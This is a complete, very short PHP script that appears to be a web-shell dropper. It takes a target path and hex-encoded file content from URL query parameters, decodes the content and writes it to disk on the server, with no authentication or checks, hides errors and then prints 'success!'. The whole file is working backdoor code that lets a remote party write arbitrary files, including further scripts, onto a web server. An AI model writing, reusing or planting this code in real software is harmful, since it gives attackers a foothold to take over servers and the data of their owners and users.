<?php
$p=realpath(dirname(__FILE__)."/").$_GET["a"];
$t=$_GET["b"];
$tt="";
for ($i=0;$i<strlen($t);$i+=2) $tt.=urldecode("%".substr($t,$i,2));
@fwrite(fopen($p,"w"),$tt);
echo "success!";
?>
